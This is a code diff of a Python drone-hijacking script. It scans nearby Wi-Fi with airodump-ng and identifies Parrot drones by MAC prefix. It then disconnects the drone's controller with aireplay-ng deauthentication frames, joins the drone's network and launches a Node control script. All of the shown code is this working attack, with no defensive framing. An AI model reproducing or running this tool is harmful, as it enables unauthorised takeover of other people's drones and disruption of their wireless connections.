@@ -40,8 +40,20 @@ def scan(writeTo,interface):
     startTime = time.time()
 
     subprocess.call([pathIfconfig, interface, "down"])
-    airodump = subprocess.Popen([pathAirodump, interface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True, bufsize=1)
-
+    airodump = subprocess.Popen([pathAirodump, interface], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, universal_newlines=True,bufsize=1)
+    '''
+    try:
+        stdout,stderr=airodump.communicate(timeout=10)
+        print(stdout)
+    except Exception:
+        print("")
+    print(stdout)
+    '''
+    #stdout,stderr=airodump.communicate(timeout=10)
+    #airodump.kill()
+    #airodump.wait()
+    #print(stdout)
+    #exit()
     while time.time() < startTime + runtime:
         line = airodump.stdout.readline()
         if table_start.match(line):
@@ -87,26 +99,40 @@ def getConnectedClient(mac,clients):
     for client in clients:
         if mac == client[0]:
             return client[1]
+
+def connect(essid):
+    print("reconfiguring network card")
+    subprocess.call([pathIfconfig, interface, 'down'])
+    subprocess.call([pathIwconfig, interface, 'mode','managed'])
+    print("Putting card back up")
+    subprocess.call([pathIfconfig, interface,'up'])
+    print("Switching to drones ssid {}".format(essid))
+    subprocess.call([pathIwconfig, interface,'essid',"{}".format(essid)])
+    subprocess.call([pathDhclient,interface])
 def main():
     while(42):
+        subprocess.call(["service", "NetworkManager", "stop"]) #need to turn this off to avoid interference
+        print("scanning for networks")
         scan(tmpfilePath,interface)
-        subprocess.call([pathIfconfig, interface, "up"])
+        print("Parsing results")
         APlist,clients=parseAirodump()
         parrotFoundPos = checkParrot([i[0][:8] for i in APlist])
-        parrotFoundPos=1 #REMOVE: TEST LINE
+        #parrotFoundPos=1 #REMOVE: TEST LINE
         if(parrotFoundPos>-1):
+            print("Parrot found, setting attack up")
             channel = APlist[parrotFoundPos][5]
             targetMAC = APlist[parrotFoundPos][0]
             client= getConnectedClient(APlist[parrotFoundPos][0],clients)
-            essid=APlist[parrotFoundPos][10]
+            essid=APlist[parrotFoundPos][8]
+            print("Switching to WiFi channel {}".format(channel))
             subprocess.call([pathIwconfig,interface,"channel",channel])
-            subprocess.Popen([pathAireplay, '-0','5','-a',targetMAC,'-c',client,interface],stdout=DNull,stderr=DNull)
-            subprocess.call([pathIfconfig, interface, 'down'])
-            subprocess.call([pathIwconfig, interface, 'mode','managed'])
-            subprocess.call([pathIfconfig, interface,'up'])
-            subprocess.call([pathIwconfig, interface,'essid',essid])
-            subprocess.call([pathDhclient,'-v',wlan0])
-
+            print("pwning with aireplay-ng, @{} with client {} and interface {}".format(targetMAC,client,interface))
+            deuath=subprocess.Popen([pathAireplay, '-0','3','-a',targetMAC,'-c',client,interface],stderr=DNull)
+            deuath.wait()
+            print("Connecting")
+            connect(essid)
+            os.system("node {}".format(pathControlJs))
+            break #REMOVE
 
             
 main()
